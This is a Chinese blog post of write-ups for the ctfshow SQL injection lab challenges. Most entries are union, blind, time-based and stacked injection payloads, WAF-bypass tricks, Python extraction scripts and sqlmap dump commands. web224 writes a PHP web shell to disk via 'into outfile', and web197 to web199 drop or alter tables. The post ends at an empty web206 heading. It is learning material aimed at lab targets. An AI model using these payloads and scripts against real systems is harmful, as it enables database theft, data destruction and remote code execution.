---
title: ctfshow SQL 注入题解
date: 2025-08-05 10:00:00
author: Xendr1a
categories: [CTF题解, ctfshow]
tags: [ctfshow, SQL注入]
description: ctfshow SQL 注入专题：联合、盲注、堆叠与 sqlmap 的逐题记录。
toc: true
---
## sql

### web171

```text
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

拼接语句，这边可以用万能密码`1' or 1=1 --+`

或者因为username不能等于flag，那我们天生反骨就去试试等于，`1' or username ='flag`也行

### web172

与上题相比多了个

```text
//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
```

使用联合注入 关键union

```text
查看回显位,经过查询发现是两位  -1' union select 1,2 --+
爆破数据库名 -1' union select 1,database() --+        为ctfshow_web
用union注入查出它的列名 id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user2') --+    列名为：id,username,password
代入列名注入，用concat合并字段 id=-1' union select 1,(select concat(username,password) from ctfshow_user2 where username='flag') --+
```

### web173

`1' union select 1,2,password from ctfshow_user3 --+`

直接测试了一下password就出来了。。。

### web174

```text
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

多了数字的过滤

嘶，不会写，去学习一下，

```text
' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,'g'),1,'h'),2,'i'),3,'j'),4,'k'),5,'l'),6,'m'),7,'n'),8,'o'),9,'p') from ctfshow_user4 --+
```

解释一下`replace()`函数就是替换的作用，防止返回出现数字以及flag

贴个大佬的脚本修回flag

```text
flag = 'ctfshow{dibcehal-abdb-kkhj-pplb-fddaleiohcgk}'
for i in range(10):
    flag = flag.replace(chr(ord(str(i)) + 55), str(i))
    print(str(i), chr(ord(str(i)) + 55))
print(flag)
```

### web177

过滤了空格和注释符，这边用/**/和%23代替

```text
payload：1'union/**/select'1',(select/**/group_concat(password)/**/from/**/ctfshow_user),3%238
```

### web178

过滤了/**/，我们可以用%0b或者%09绕过

```text
payload:999'union%0bselect%0b1,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername%0b='flag'),'3
```

看了看其他的payload因为只是过滤掉了/**/ # 等，所以使用万能密码也行

### web179

过滤了%0b,%09,%0a,我们还有%0c

```text
payload:999'union%0cselect%0c1,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c='flag'),'3
```

### web180

上题的payload也能用，应该还是过滤了空格

### web181

```text
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
      
```

```text
payload:'or`username`='flag
```

### web182

过滤了flag，用到了like的模糊匹配

```text
payload：'or`username`like'fla%
```

### web183

```text
import requests
import time

url="http://83593207-b0af-4a8c-9ff8-a55f190892e4.challenge.ctf.show/select-waf.php"
response = requests.get(url, verify=False)
flag_params="0123456789-{}qwertyuiopasdfghjklzxcvbnm"

flag=""

for i in range(0,40):
	for x in flag_params:
		post_data={
			# "tableName":"`ctfshow_user`where`pass`regexp(\"ctfshow{}\")".format(flag+x)
			"tableName":"`ctfshow_user`where`pass`like\"ctfshow{}%\"".format(flag+x)
		}
		response = requests.post(url, data=post_data)
		time.sleep(0.2)
		if response.text.find("user_count = 1;")>0 :
			print("{} is right".format(flag+x))
			flag+=x
			break
		else:
			print("{} is wrong".format(flag+x))
			continue
	print("{} is right flag string".format(flag))
```

运行没证书那试试把https改为http

### web184

```text
import requests
import time

url = "http://89ebc708-7d70-40ca-8daa-f0e98b159419.challenge.ctf.show/select-waf.php"
flag_params = "0123456789-{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*"

def str2hex(s):
    return s.encode().hex()

def main():
    flag = "ctfshow{"
    i = len(flag)
    while True:
        for x in flag_params:
            # 构造精确匹配的正则表达式
            pattern = f'^{flag}{x}'
            hex_pattern = str2hex(pattern)

            post_data = {
                "tableName": f"ctfshow_user group by pass having pass regexp(0x{hex_pattern}) -- "
            }

            try:
                response = requests.post(url, data=post_data, timeout=5)
                if "user_count = 1;" in response.text:
                    flag += x
                    print(f"[+] Current flag: {flag}")
                    if x == '}':  # 遇到结束符终止
                        print(f"[!] Final flag: {flag}")
                        return
                    break
                time.sleep(0.5)
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(2)
        else:  # 遍历完所有字符未找到匹配
            print("[!] No matching character found")
            return

if __name__ == "__main__":
    main()
```

```text
REGEXP 运算符用于在 SQL 查询中匹配文本模式
```

空格没被过滤了，反而where被过滤了，这里使用having绕过

然后因为“号被ban的情况下，可以使用16进制去绕过

### web185

数字被过滤了我们要改数字

```text
利用到了ture==1
ture+ture==2
flase==0
concat(...) 中的 chr 表达式会动态生成正则表达式字符串（如 ^ctfshow{a）
```

```text
import requests

def creatNum(n):  # 3 = true + true + true
    str = ''
    for i in range(1, n + 1):
        if i == 1:
            str += "true"
        else:
            str += "+true"
    return str

def creatStr(str):  # 将'23'变成 char(true+true),char(true+true+true)
    res = ""
    for i in range(1, len(str) + 1):
        temp = ord(str[i - 1])
        if i == 1:
            res = "chr(" + creatNum(temp) + ")"
        else:
            res += "," + "chr(" + creatNum(temp) + ")"
    return res

url = "http://2bc37396-a458-4aaa-8140-fe38163deb3a.challenge.ctf.show/select-waf.php"
letters = letter = r"{0123456789abcdefg-}hijklmnopqrstuvwxyz"
flag = "ctfshow{"
for i in range(50):
    for ch in letters:
        result = creatStr(flag + ch)
        data = {"tableName": "ctfshow_user group by pass having pass regexp(concat({}))".format(result)}
        res = requests.post(url=url, data=data)
        if "$user_count = 1;" in res.text:
            flag += ch
            print(flag)
            break  
```

### web186

新增过滤  \%|\<|\>|\^

上个脚本一样能用

### web187

```text
username:admin
password:ffifdyop
```

### web188

admin和password都是弱比较匹配

```text
select pass from ctfshow_user where username = 0 and password = 0;，由于username password是字符串，弱比较成了0,0=0成立，所条件就成立了；最后查询语句就成了：select pass from ctfshow_user where 1;
```

### web189

盲注，主要抓包注意到回显不同，然后利用load_file读取文件

```text
if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)
```

```text
import requests

url = "http://662ee5eb-523f-49db-8748-fca2a6d708e3.challenge.ctf.show/api/index.php"

str = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

flag = "ctfshow{"

for i in range(0,100):

 for j in str:

    data = {"username":"if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag + j),

            "password":0}

    res = requests.post(url=url, data=data)

    if r"\u5bc6\u7801\u9519\u8bef" in res.text:

        flag += j

        print(flag)

        if j=="}":

            exit()

        break
```

### web190

```text
import requests
import sys
import time

url = "http://2920a50f-f57e-4f76-b994-bb34c8783643.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    min = 32
    while 1:
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and (ascii(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i,mid)

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            max = mid
        else:
            min = mid
```

### web191（布尔盲注

ascii被过滤了，我们可以使用作用基本上相同的ord

```text
import requests
import sys
import time

url = "http://c5f6403a-b365-4e18-9aa8-45c52d21e570.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    min = 32
    while 1:
        mid = (max+min)>>1
        if(min == mid):
            flag += chr(mid)
            print(flag)
            break
        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i,mid)

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            max = mid
        else:
            min = mid
```

### web192

都过滤了那我们直接判断

```text
import requests
import sys
import time

url = "http://5054937c-c765-4a55-8151-13ef9ff45b1a.challenge.ctf.show/api/"
flag = ""
for i in range(1,60):
    max = 127
    mid = 32
    while 1:
        mid +=1

        #payload = "admin'and (ascii(substr((select database()),{},1))<{})#".format(i,mid)
        #ctfshow_web
        #payload = "admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{})#".format(i,mid)
        #ctfshow_fl0g
        #payload = "admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))<{})#".format(i,mid)
        #id,f1ag
        payload = "admin'and ((substr((select f1ag from ctfshow_fl0g),{},1)='{}'))#".format(i,chr(mid))

        data = {
            "username":payload,
            "password":0,
        }
        res = requests.post(url = url,data =data)
        time.sleep(0.3)
        if res.text.find("8bef")>0:
            flag+=chr(mid)
            print("***********"+flag)
            break
```

### web193-194

substr用mid替换

```text
import requests

url = "http://f8cc921e-653a-4710-b2b3-bb1b744f1772.challenge.ctf.show/api/index.php"
out = ''
dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
for j in range(1, 50):
    print(j)
    for k in dic:

        # data = {
        #     'username': f"0'||if(substr((select f1ag from ctfshow_fl0g),{j},1)='{k}',1,0)#",
        #     'password': '1'
        # }

       # data = {
       #     'username': f"0'||if((mid((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flxg'),{j},1))='{k}',1,0)#",
       #     'password': '1'
       # }
        data = {
                'username': f"0'||if((mid((select f1ag from ctfshow_flxg),{j},1))='{k}',1,0)#",
                'password': '1'
             }
        re = requests.post(url, data=data)
        if ("\\u5bc6\\u7801\\u9519\\u8bef" in re.text):
            out += k
            print(out)
            break
```

可以用 left 函数，从提供的字符串的左侧提取给定数量的字符，例如 LEFT('SQLServer'，3) 返回 SQL。

```text
'username': f"0'||if((left((select f1ag from ctfshow_flxg),{j}))='{out+k}',1,0)#"
```

有 left 当然就有 right：

RIGHT () 函数用于从字符串中检索最右边的指定长度的字符，这里稍微改一下结果的拼接方式

```text
'username': f"0'||if((right((select f1ag from ctfshow_flxg),{j}))='{k+out}',1,0)#"         #输出是反过来的
```

，还可以用 lpad 和 rpad：

```text
lpad('123456',2) 结果为 12
 
lpad('123456',7,'0') 结果为 0123456，左填充到字符串
#因此，我们不指定第三个参数，就可以实现和 left 和 right 一样的效果。
```

### web195（堆叠注入

根据提示是堆叠注入，然后不会，看wp

```text
说是直接修改用户名和密码
1;update(ctfshow_user)set`username`=1,`pass`=1;
```

```text
1. UPDATE语句的基本语法
UPDATE语句的基本语法如下所示：

sql
UPDATE <表名> 
SET 字段1 = 值1, 字段2 = 值2, ... 
WHERE <筛选条件>;
 

1.1 语法解析
<表名>：指定要更新数据的目标表。

SET 字段1 = 值1, 字段2 = 值2, ...：列出要更新的字段及其对应的新值。字段与值之间使用等号=连接，多个字段使用逗号,分隔。

WHERE <筛选条件>：指定哪些记录需要更新，确保只修改符合条件的行。
```

### web196

```text
1;select(1);
1
#第二个语句控制密码？可能是这样
```

### web197

```text
好玩的姿势
1;drop table ctfshow_user;  先删表  
create table ctfshow_user(username varchar(100),pass varchar(100)); 然后建表  
insert ctfshow_user(username,pass) value (1,2);  然后插入数字
```

```text
也有类似于上一题的姿势
username: 1;show tables 
password: ctfshow_user
```

### web198

```text
insert ctfshow_user(`username`,`pass`) value(1,2);
```

```text
或者0;alter table ctfshow_user change `username` `passw` varchar(100);
alter table ctfshow_user change `pass` `username` varchar(100);
alter table ctfshow_user change `passw` `pass` varchar(100);
#这个的前提是已知一个用户为userAUTO,我也不知道是怎么来的；就是说修改两个表名，然后使用0弱比较匹配用户名，输入密码userAUTO
#Alter是数据库SQL语言的修改语句，可以用来修改基本表，其一般表示格式为：
ALTER TABLE<表名>[改变方式]
```

### web199

多加了个括号过滤

```text
可以直接show tables;
```

```text
或者类似于上一题改为使用test
0;alter table ctfshow_user change `username` `passw` text;
alter table ctfshow_user change `pass` `username` text;
alter table ctfshow_user change `passw` `pass` text;
```

### web200

加了个逗号，可用上一题解法

### web214(时间盲注

```text
#import requests

#url = "http://1af8396a-0c8b-4ce1-842d-ff0df2c7e96d.challenge.ctf.show/api/index.php"
#out = ''
#dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
#for j in range(1, 50):
#    print(j)
#    for k in dic:
#        data = {'debug':'1','ip':f"if(substr(database(),{j},1)='{k}',sleep(3),0)"}
#        re = requests.post(url, data=data)
#        if re.elapsed.total_seconds()>2:
#            out += k
#            print(out)
#            break           库是ctfshow_web
import requests

url = "http://af06a8e3-a6e1-4096-b8a4-c34921788535.challenge.ctf.show/api/index.php"
out = ''
dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
for j in range(1, 50):
    print(j)
    for k in dic:
        #data ={'debug':'1','ip':f"if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0,1),{j},1)='{k}',sleep(3),0)"}
        #data ={'debug':'1','ip':f"if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagx'), {j}, 1) = '{k}',sleep(3),0)"}
        data= {'debug': '1','ip': f"if(substr((select flaga from ctfshow_flagx), {j}, 1) = '{k}',sleep(3),0)"}
        re = requests.post(url, data=data)
        if re.elapsed.total_seconds()>2:
            out += k
            print(out)
            break              #表是ctfshow_flagx  列名是id flaga info
```

### web215

加了单引号那就是要闭合和过滤了

```text
import requests

url = "http://8b3e1f15-ab2f-460d-b66e-709d75f56f71.challenge.ctf.show/api/index.php"
out = ''
dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
for j in range(1, 50):
    print(j)
    for k in dic:
        #data = {'debug': '1', 'ip': f"0' or if(substr(database(),{j},1)='{k}',sleep(3),0)#"}
        #data ={'debug':'1','ip':f"0' or if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0,1),{j},1)='{k}',sleep(3),0)#"}
        #data ={'debug':'1','ip':f"0' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxc'), {j}, 1) = '{k}',sleep(3),0)#"}
        data= {'debug': '1','ip': f"0' or if(substr((select flagaa from ctfshow_flagxc), {j}, 1) = '{k}',sleep(3),0)#"}
        re = requests.post(url, data=data)
        if re.elapsed.total_seconds()>2:
            out += k
            print(out)
            break
```

### web216

```text
 where id = from_base64($id);被base包了
```

闭合id！

```text
import requests

url = "http://cf429fb8-a50a-4f1b-a485-0ee25626ce17.challenge.ctf.show/api/index.php"
out = ''
dic = '{-}0123456789abcdefghijklmnopqrstuvwxyz_'
for j in range(1, 50):
    print(j)
    for k in dic:
        #data = {'debug': '1', 'ip': f"0) or if(substr(database(),{j},1)='{k}',sleep(3),0)#"}
        #data ={'debug':'1','ip':f"0) or if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0,1),{j},1)='{k}',sleep(3),0)#"}
        #data ={'debug':'1','ip':f"0) or if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxcc'), {j}, 1) = '{k}',sleep(3),0)#"}
        data = {'debug': '1','ip': f"0) or if(substr((select flagaac from ctfshow_flagxcc), {j}, 1) = '{k}',sleep(3),0)#"}
        re = requests.post(url, data=data)
        if re.elapsed.total_seconds()>2:
            out += k
            print(out)
            break
```

### web217

用benchmark代替sleep

```text
import requests
import string

url = "http://3d3eeac2-0f6c-42bc-be41-1f1b03928245.challenge.ctf.show/api/index.php"
out = ''
dic = string.digits + string.ascii_lowercase + '{}-_'
for j in range(1, 50):
    print(j)
    for k in dic:
        #data = {'debug': '1', 'ip': f"if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0, 1), {j}, 1) = '{k}',benchmark(3000000,md5('abcd')),0)"}
        #data ={'debug':'1','ip':f"0) or if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxccb'), {j}, 1) = '{k}',benchmark(3000000,md5('abcd')),0)#"}
        data= {'debug': '1','ip': f"0) or if(substr((select flagaabc from ctfshow_flagxccb), {j}, 1) = '{k}',benchmark(3000000,md5('abcd')),0)#"}
        re = requests.post(url, data=data)
        if re.elapsed.total_seconds()>2:
            out += k
            print(out)
            break
```

### web218

利用正则匹配时间的长短来检测所匹配的数据正误

```text
import requests
from time import *
import string

url=''
bli=string.digits+string.ascii_lowercase+'{}-_'
out=''
yanshi="concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) rlike concat(repeat('(a.*)+',6),'b')"
#rlike和regexp 是 SQL 中用于执行正则表达式匹配的函数。
#repeat(str,times) 就是复制 str 字符串 times 次。
#rpad(str,len,padstr) 用字符串 padstr 对 str 进行右边填补直到长度达到 len，返回 str 
for j in range(1,50):
    for k in bli:
        sleep(0.2)
        # payload = {'debug':'1','ip':f"if(substr(database(),{j},1)='{k}',{delay},0)"}  # 猜数据库名
        # payload = {'debug': '1', 'ip': f"if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0, 1), {j}, 1) = '{k}',{delay},0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'), {j}, 1) = '{k}',{delay},0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxc'), {j}, 1) = '{k}',{delay},0)"}  # 猜列名
        payload={
            'debug':'1',
            'id':f"if(substr(select flagaac from ctfshow_flagxc),{j},1)='{k}',{yanshi},0)"}
        try:
            re=requests.post(url,data=payload,timeout=0.8)
        except:
            out+=k
            break

    print(out)
    sleep(1)
```

### web219

```text
笛卡尔积（不是很了解但是能用
#if(2>1,(select count(*) from information_schema.columns A)判断时间差异

import requests
import string

url = 'http://1181c50a-0d3f-4101-84c6-21aa14dfaec8.challenge.ctf.show/api/index.php'
dic = string.digits + string.ascii_lowercase + '{}-_'
out = ''

for j in range(1, 50):
    for k in dic:
        # payload = {'debug':'1','ip':f"if(substr(database(),{j},1)='{k}',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜数据库名
        # payload = {'debug': '1', 'ip': f"if(substr((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0, 1), {j}, 1) = '{k}',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'), {j}, 1) = '{k}',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxca'), {j}, 1) = '{k}',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜列名
        payload = {'debug': '1',
                   'ip': f"if(substr((select flagaabc from ctfshow_flagxca), {j}, 1) = '{k}',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 跑flag
        re = requests.post(url, data=payload)
        if re.elapsed.total_seconds() > 0.4:
            out += k
            break
    print(out)
```

### web220

```text
过滤掉了 sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr
因此没有使用到 ascii ，就算是基于 ASCII 码值判断的，ascii 被过滤了，也可以用ord 替代；
rlike 被过滤，如果用正则的注入则可以采用 regexp 代替；
mid、substr 被过滤，可以采用 right、left、rpad、lpad 等，这个方法在前面布尔盲注我们已经介绍过了，这里还可以采用 like
```

```text
import requests
import string

url = 'http://cf767830-380e-4674-9099-bca4bcfcdb34.challenge.ctf.show/api/index.php'
dic = string.digits + string.ascii_lowercase + '{}-_'
out = ''

for j in range(1, 50):
    for k in dic:
        # payload = {'debug':'1','ip':f"if(database() like '{out+k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜数据库名
        # payload = {'debug': '1', 'ip': f"if((select table_name from information_schema.tables where table_schema='ctfshow_web' limit 0, 1) like '{out+k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web') like '{out+k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜表名
        # payload = {'debug': '1','ip': f"if((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxcac') like '{out+k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜列名
        # payload = {'debug': '1','ip': f"if((select column_name from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_flagxcac' limit 1, 1) like '{out + k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 猜列名
        payload = {'debug': '1',
                   'ip': f"if((select flagaabcc from ctfshow_flagxcac) like '{out + k}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)"}  # 跑flag
        re = requests.post(url, data=payload)
        if re.elapsed.total_seconds() > 0.3:
            out += k
            break
    print(out)
```

### web221

```text
limit注入 LIMIT
网上直接能找到板子
http://xxxx/xxxx.php?id=1 procedure analyse(extractvalue(rand(),concat(0x3a,(注入语句 LIMIT 0,1))),1)%23
直接提交数据库就行了
/api/?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)#
```

### web222（group by

```text
import requests
import time
url = 'http://a8a8c7a5-de31-4ef4-89fd-e29eec574fc8.challenge.ctf.show/api/?u='
url2 = ' &page=1&limit=10'
str = ''
for i in range(60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},sleep(0.05),'False')"
        # 爆列
        # payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'),{i},1))<{j},sleep(0.05),'False')"
        # 爆值
        payload = f"if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),{i},1))<{j},sleep(0.05),'False')"
        url0 = url + payload + url2
        start_time = time.time()
        r = requests.get(url=url0).text
        end_time = time.time()
        sub = end_time - start_time
        if sub >= 1:
            max = j
        else:
            min = j
```

### web223（group by无数字

```text
增加了数字的过滤
可以利用ture=1来绕过，比如我们想构造一个字符 1 ，则会被转换为：
concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true))
也就是 char(49)
加号要编码一下，因为这里是 get 传参并且进行了 URL 解码，如果拼接方式是加号会导致服务器错误的解析为空格，从而无法识别，没有回显，需要对加号进行 URL 编码再传入，即 %2b 。

或者利用ascii单独对数字就行处理
```

```text
   #1
import requests
import string
 
def convert(value):
    t = 'concat('
    # 处理数字
    if isinstance(value, int):
        t += 'char(true' + '%2btrue' * (value - 1) + '),'
    # 处理字符
    elif isinstance(value, str):
        for s in value:
            t += 'char(true' + '%2btrue' * (ord(s) - 1) + '),'
    return t[:-1] + ")"
# 测试转换数字1
# print(convert(1))
# 测试转换字符串 '1'
# print(convert('1'))
 
url = 'http://1742166c-83ef-461b-88f9-348a8dfafb75.challenge.ctf.show/api/index.php'
dic = string.digits+string.ascii_lowercase+'{}-_'
out = ''
 
for j in range(1,50):
    a = convert(f'{j}')
    for k in dic:
        b = convert(f'{k}')
        # payload = (f"u=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{a},true)={b},username,'a')")  # 跑表名
        # print(payload)
        # payload = f"u=if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'),{a},true)={b},username,'a')"  # 跑列名
        payload = f"u=if(substr((select flagasabc from ctfshow_flagas),{a},true)={b},username,'a')"  # 布尔盲注跑flag
        # payload = f"u=if(substr((select flagaabc from ctfshow_flaga),{j},1)='{k}',sleep(0.1),0)"  # 时间盲注跑flag
        re = requests.get(url, params=payload)
        if "passwordAUTO" in re.text:
        # if re.elapsed.total_seconds() > 2:
            out += k
            break
    print(out)
```

```text
#2  
import requests
import string
 
def convert(v):
    v = str(v)
    return "concat(" + ",".join([f"ascii('%0{c}')" for c in v]) + ")"
 
 
url = 'http://1742166c-83ef-461b-88f9-348a8dfafb75.challenge.ctf.show/api/index.php'
dic = string.digits+string.ascii_lowercase+'{}-_'
out = ''
 
for j in range(1,50):
    a = convert(f'{j}')
    # print(a)
    for k in dic:
        if k in '0123456789':
            b = convert(f'{k}')
            payload = f"u=if(substr((select flagasabc from ctfshow_flagas),{a},true)={b},username,'a')"  # 数字字符会转成concat形式，默认就是字符，不需要引号包裹
        else:
            b = f'{k}'
            payload = f"u=if(substr((select flagasabc from ctfshow_flagas),{a},true)='{b}',username,'a')"  # 非数字字符需要使用引号包裹才会被认为是字符串
        # print(b)
        # payload = (f"u=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{a},true)='{b}',username,'a')")  # 跑表名
        # print(payload)
        # payload = f"u=if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'),{a},true)='{b}',username,'a')"  # 跑列名
        re = requests.get(url, params=payload)
        if "passwordAUTO" in re.text:
            out += k
            break
    print(out)
```

### web224（文件注入

```text
登录找注入点发现啥也没有，扫一下发现了robots.txt,有个路由进去能改密码
然后是一个文件上传页面
然后不会了
```

```text
构造一个特殊的txt文本上传，将下面的内容写到txt文件中，上传文件。 0x3c3f3d60245f4745545b315d603f3e 是一句话 的16进制形式。<?=`$_GET[1]`?>
C64File "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
群里也有payload.bin
然后就能rce了
```

### web225（HANDLER命令

前三部分用show拿信息

```text
username=';show%20databases;
username=';show%20tables%20from%20ctfshow_web; 
username=';show%20columns%20from%20ctfshow_web.ctfshow_flagasa; 
```

禁用了select，我们用handler来读取

```text
username=';handler%20ctfshow_flagasa%20open;handler%20ctfshow_flagasa%20read%20first;HANDLER%20ctfshow_flagasa%20CLOSE;
```

## sqlmap

### web201

```text
sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show
爆数据库

sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs
爆表

sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web --tables 
爆列

sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web -T ctfshow_user --columns
爆值

sqlmap -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web -T ctfshow_user --dump 
```

### web202

改请求方式

```text
sqlmap -u http://3702c6fc-0dca-4e2b-aa95-dc334b33eebd.challenge.ctf.show/api/ --data 'id=1' --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
```

### web203

```text
sqlmap -u "http://00ab91ca-936c-4f20-a55c-fc72fd22c9d3.challenge.ctf.show/api/index.php" --method="PUT" --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" -D ctfshow_web -T ctfshow_user -C pass --dump 

需要加上--headers="Content-Type: text/plain"，否则是按表单提交的
```

### web204

加上cookie

```text
sqlmap -u "http://6048258b-d15b-4527-aff1-1e1cd9c1fad8.challenge.ctf.show/api/index.php" --method="PUT" --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --cookie="ctfshow=5c1aef87df7951580e410b7bff716ed5;PHPSESSID=3ajnn0doc03pm1rfpau7q01iaq" -D ctfshow_web -T ctfshow_user -C pass --dump
```

### web205

注意换表了

```text
sqlmap -u "http://633836b2-516f-439f-8b39-ec69dcb72462.challenge.ctf.show/api/index.php"  --method="PUT" --data="id=1" --referer=ctf.show --safe-url="http://633836b2-516f-439f-8b39-ec69dcb72462.challenge.ctf.show/api/getToken.php" --safe-freq=1 --headers="Content-Type: text/plain" --cookie="PHPSESSID=t8tv3cv6grjbj2iivg5qavif8h;" -D ctfshow_web -T ctfshow_flax --dump
```

### web206

```text
